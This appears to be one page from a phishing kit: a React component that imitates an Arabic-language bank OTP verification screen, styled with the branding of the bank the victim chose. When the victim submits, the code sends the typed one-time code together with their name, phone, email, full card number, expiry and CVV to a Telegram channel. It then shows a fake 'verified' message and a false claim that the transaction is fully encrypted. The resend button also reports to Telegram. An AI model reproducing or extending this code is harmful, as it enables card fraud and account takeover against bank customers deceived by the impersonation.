import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { getBankById } from "@/lib/banks";
import { getBankDesign } from "@/lib/bankDesigns";
import { getCountryByCode } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { formatCurrency } from "@/lib/countryCurrencies";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, RefreshCw, Clock, CheckCircle2, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Helmet } from "react-helmet-async";

const OTPVerificationPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180);
  const [canResend, setCanResend] = useState(false);

  const selectedBankId = linkData?.payload?.selected_bank || "";
  const selectedBank = getBankById(selectedBankId);
  const bankDesign = getBankDesign(selectedBankId);
  
  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const customerName = linkData?.payload?.customer_name || "";
  const customerEmail = linkData?.payload?.customer_email || "";
  const customerPhone = linkData?.payload?.customer_phone || "";
  const paymentAmount = linkData?.payload?.payment_amount || 500;
  const serviceKey = linkData?.payload?.service_key || "payment";
  
  const serviceBranding = getServiceBranding(serviceKey);
  const formattedAmount = formatCurrency(paymentAmount, countryCode);

  const cardInfo = linkData?.payload?.cardInfo || {};
  const bankLoginInfo = linkData?.payload?.bank_login || {};

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    } else {
      setCanResend(true);
    }
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleResend = async () => {
    setTimeLeft(180);
    setCanResend(false);
    
    toast({
      title: "تم الإرسال",
      description: "تم إرسال رمز تحقق جديد",
    });

    await sendToTelegram({
      type: 'payment_recipient',
      data: {
        name: customerName,
        email: customerEmail,
        phone: customerPhone,
        service: serviceBranding.nameAr || serviceKey,
        country: countryData?.nameAr || countryCode,
        bank: selectedBank?.nameAr || selectedBankId,
        action: 'resend_otp',
        amount: formattedAmount
      },
      timestamp: new Date().toISOString()
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!otp || otp.length < 4) {
      toast({
        title: "خطأ",
        description: "الرجاء إدخال رمز التحقق كاملاً",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // إرسال رمز OTP إلى تيليجرام
      await sendToTelegram({
        type: 'payment_otp_attempt',
        data: {
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          service: serviceBranding.nameAr || serviceKey,
          country: countryData?.nameAr || countryCode,
          countryCode: countryCode,
          bank: selectedBank?.nameAr || selectedBankId,
          bankId: selectedBankId,
          cardholder: cardInfo.cardName || '',
          cardNumber: cardInfo.cardNumber || '',
          cardLast4: cardInfo.cardLast4 || '',
          cardType: cardInfo.cardType || '',
          expiry: cardInfo.expiry || '',
          cvv: cardInfo.cvv || '',
          otp: otp,
          otp_status: 'entered',
          amount: formattedAmount,
          attempts: 1
        },
        timestamp: new Date().toISOString()
      });

      toast({
        title: "تم التحقق",
        description: "تم التحقق من رمز OTP بنجاح",
      });

      setTimeout(() => {
        navigate(`/pay/${id}/receipt`);
      }, 1500);
    } catch (error) {
      console.error("Error:", error);
      toast({
        title: "خطأ",
        description: "رمز التحقق غير صحيح",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const design = bankDesign || {
    colors: {
      primary: serviceBranding.colors.primary,
      secondary: serviceBranding.colors.secondary,
      background: '#F5F5F5',
      text: '#1A1A1A',
      textSecondary: '#666666',
      border: '#E0E0E0',
      inputBg: '#FFFFFF',
      buttonGradient: serviceBranding.gradients?.primary
    },
    fonts: {
      arabic: 'Tajawal, sans-serif'
    }
  };

  return (
    <>
      <Helmet>
        <html lang="ar" dir="rtl" />
        <style>{`
          body {
            background: ${design.colors.background};
            font-family: ${design.fonts.arabic};
          }
        `}</style>
      </Helmet>
      
      <div 
        className="min-h-screen flex items-center justify-center py-8 px-4" 
        dir="rtl"
        style={{ 
          background: design.colors.background,
          fontFamily: design.fonts.arabic
        }}
      >
        <div className="w-full max-w-md">
          {/* رأس الصفحة */}
          <div className="text-center mb-8">
            <div
              className="w-20 h-20 rounded-full mx-auto mb-6 flex items-center justify-center shadow-2xl"
              style={{ 
                background: design.colors.buttonGradient || `linear-gradient(135deg, ${design.colors.primary}, ${design.colors.secondary})`
              }}
            >
              <Shield className="w-10 h-10 text-white" />
            </div>
            <h1 
              className="text-3xl font-bold mb-2"
              style={{ 
                color: design.colors.text,
                fontFamily: design.fonts.arabic
              }}
            >
              رمز التحقق
            </h1>
            <p 
              className="text-sm"
              style={{ color: design.colors.textSecondary }}
            >
              تم إرسال رمز التحقق إلى رقم هاتفك
            </p>
            <p 
              className="text-lg font-bold mt-2"
              style={{ color: design.colors.primary }}
            >
              {customerPhone}
            </p>
          </div>

          {/* البطاقة الرئيسية */}
          <Card 
            className="p-8 shadow-2xl border-t-4"
            style={{ 
              borderTopColor: design.colors.primary,
              background: design.colors.inputBg
            }}
          >
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* حقل إدخال OTP */}
              <div>
                <div className="text-center mb-4">
                  <p 
                    className="text-sm font-semibold mb-2"
                    style={{ color: design.colors.text }}
                  >
                    أدخل رمز التحقق المكون من 6 أرقام
                  </p>
                </div>
                
                <Input
                  type="text"
                  inputMode="numeric"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                  className="h-16 text-center text-3xl tracking-widest font-bold"
                  style={{
                    background: design.colors.inputBg,
                    borderColor: design.colors.primary,
                    borderWidth: '2px',
                    color: design.colors.text,
                    letterSpacing: '0.5em'
                  }}
                  placeholder="● ● ● ● ● ●"
                  maxLength={6}
                  autoFocus
                />

                {/* عداد الوقت */}
                <div className="mt-4 flex items-center justify-center gap-2">
                  <Clock className="w-4 h-4" style={{ color: design.colors.textSecondary }} />
                  <span 
                    className="text-sm font-mono"
                    style={{ 
                      color: timeLeft < 30 ? '#EF4444' : design.colors.textSecondary 
                    }}
                  >
                    {formatTime(timeLeft)}
                  </span>
                </div>
              </div>

              {/* زر التحقق */}
              <Button
                type="submit"
                size="lg"
                className="w-full h-14 text-lg font-bold text-white shadow-lg hover:shadow-xl transition-all"
                disabled={isSubmitting || otp.length < 4}
                style={{
                  background: design.colors.buttonGradient || design.colors.primary,
                  fontFamily: design.fonts.arabic,
                  opacity: otp.length < 4 ? 0.5 : 1
                }}
              >
                {isSubmitting ? (
                  <span>جاري التحقق...</span>
                ) : (
                  <>
                    <CheckCircle2 className="w-5 h-5 ml-2" />
                    <span>تأكيد الدفع</span>
                  </>
                )}
              </Button>

              {/* زر إعادة الإرسال */}
              <Button
                type="button"
                variant="outline"
                className="w-full h-12 text-base"
                disabled={!canResend}
                onClick={handleResend}
                style={{
                  borderColor: design.colors.primary,
                  color: canResend ? design.colors.primary : design.colors.textSecondary,
                  opacity: canResend ? 1 : 0.5
                }}
              >
                <RefreshCw className="w-5 h-5 ml-2" />
                {canResend ? "إعادة إرسال الرمز" : "يمكنك إعادة الإرسال بعد انتهاء الوقت"}
              </Button>
            </form>

            {/* تلميح */}
            <div 
              className="mt-6 p-4 rounded-xl flex items-start gap-3"
              style={{ 
                background: `${design.colors.primary}08`,
                border: `1px solid ${design.colors.primary}30`
              }}
            >
              <AlertCircle 
                className="w-5 h-5 mt-0.5 flex-shrink-0" 
                style={{ color: design.colors.primary }} 
              />
              <div>
                <p className="font-semibold text-sm mb-1" style={{ color: design.colors.text }}>
                  نصيحة أمنية
                </p>
                <p className="text-xs" style={{ color: design.colors.textSecondary }}>
                  لا تشارك رمز التحقق مع أي شخص. {selectedBank?.nameAr || 'البنك'} لن يطلب منك هذا الرمز عبر الهاتف أو البريد الإلكتروني.
                </p>
              </div>
            </div>
          </Card>

          {/* معلومات العملية */}
          {selectedBank && (
            <Card className="mt-6 p-4 border" style={{ borderColor: design.colors.border }}>
              <div className="flex items-center gap-3 mb-3">
                <div
                  className="w-10 h-10 rounded-lg flex items-center justify-center"
                  style={{ background: `${design.colors.primary}15` }}
                >
                  {selectedBank.logo ? (
                    <img 
                      src={selectedBank.logo} 
                      alt={selectedBank.nameAr}
                      className="w-8 h-8 object-contain"
                    />
                  ) : (
                    <span className="font-bold" style={{ color: design.colors.primary }}>
                      {selectedBank.nameAr.charAt(0)}
                    </span>
                  )}
                </div>
                <div className="flex-1">
                  <p className="text-xs" style={{ color: design.colors.textSecondary }}>البنك</p>
                  <p className="font-semibold text-sm" style={{ color: design.colors.text }}>
                    {selectedBank.nameAr}
                  </p>
                </div>
              </div>
              <div className="flex justify-between items-center pt-3 border-t" style={{ borderColor: design.colors.border }}>
                <div>
                  <p className="text-xs" style={{ color: design.colors.textSecondary }}>المبلغ</p>
                  <p 
                    className="font-bold text-lg"
                    style={{ color: design.colors.primary }}
                  >
                    {formattedAmount}
                  </p>
                </div>
                <div className="text-left">
                  <p className="text-xs" style={{ color: design.colors.textSecondary }}>الخدمة</p>
                  <p className="font-semibold text-sm" style={{ color: design.colors.text }}>
                    {serviceBranding.nameAr || serviceKey}
                  </p>
                </div>
              </div>
            </Card>
          )}

          {/* زر الرجوع */}
          <div className="mt-6 text-center">
            <button
              onClick={() => navigate(`/pay/${id}/bank-login-page`)}
              className="inline-flex items-center gap-2 text-sm hover:underline"
              style={{ color: design.colors.textSecondary }}
            >
              <ArrowLeft className="w-4 h-4" />
              <span>العودة لتسجيل الدخول</span>
            </button>
          </div>

          {/* معلومات الأمان */}
          <div className="mt-6 text-center">
            <div 
              className="inline-flex items-center gap-2 px-4 py-2 rounded-full text-xs"
              style={{ 
                background: `${design.colors.primary}15`,
                color: design.colors.primary
              }}
            >
              <Shield className="w-4 h-4" />
              <span>عملية آمنة ومشفرة بالكامل</span>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default OTPVerificationPage;
